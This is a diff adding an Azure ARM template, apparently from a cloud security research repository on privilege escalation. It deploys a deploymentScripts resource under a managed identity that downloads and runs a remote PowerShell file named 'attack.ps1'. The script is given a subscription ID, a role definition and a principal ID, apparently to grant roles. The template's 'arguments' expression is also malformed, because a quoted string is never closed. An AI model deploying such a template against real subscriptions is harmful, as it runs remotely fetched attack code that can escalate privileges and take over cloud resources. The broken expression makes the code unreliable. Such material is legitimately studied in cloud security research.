@@ -1,0 +1,47 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "managedIdentityName": {
+            "type": "string"
+        },
+        "roleDefinition": {
+            "type": "string"
+        },
+        "principalId": {
+            "type": "string"
+        },
+        "guid": {
+            "type": "string",
+            "defaultValue": "[newGuid(managedIdentityName)]"
+        }
+    },
+    "resources": [
+        {
+            "type": "Microsoft.Resources/deploymentScripts",
+            "apiVersion": "2020-10-01",
+            "name": "SetPermissions",
+            "location": "[resourceGroup().location]",
+            "kind": "AzurePowerShell",
+            "identity": {
+                "type": "UserAssigned",
+                "userAssignedIdentities": {
+                    "[resourceID('Microsoft.ManagedIdentity/userAssignedIdentities/', parameters('managedIdentityName'))]": {}
+                }
+            },
+            "properties": {
+                "forceUpdateTag": "[parameters('guid')]",
+                "azPowerShellVersion": "5.4",
+                "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2}, subscription().id, parameters('roleDefinition'), parameters('principalId'), parameters('guid')]",
+                "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/main/priv-sec-arm-template/attack.ps1",
+                "supportingScriptUris": [],
+                "timeout": "PT30M",
+                "cleanupPreference": "Always",
+                "retentionInterval": "P1D",
+                "containerSettings": {
+                    "containerGroupName": "remove"
+                }
+            }
+        }
+    ]
+}
